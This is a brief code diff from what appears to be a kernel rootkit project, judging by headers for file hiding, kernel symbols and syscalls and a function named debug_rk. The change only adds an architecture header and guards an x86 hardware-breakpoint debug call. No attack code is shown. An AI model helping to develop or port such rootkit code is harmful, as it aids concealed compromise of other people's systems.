@@ -1,3 +1,4 @@
+#include <anima/arch.h>
 #include <anima/config.h>
 #include <anima/debug.h>
 #include <anima/hide_file.h>
@@ -5,7 +6,6 @@
 #include <anima/ksyms.h>
 #include <anima/syscalls.h>
 #include <anima/vfs.h>
-#include <anima/x86.h>
 
 #ifdef DEBUG
 
@@ -15,7 +15,9 @@ struct syscall_stat sys_stats[NR_SYSCALLS] = { {0} };
 
 void debug_rk(void)
 {
+#if ARCH_X86
 	x86_hw_breakpoint_debug();
+#endif
 	vfs_debug();
 }
 
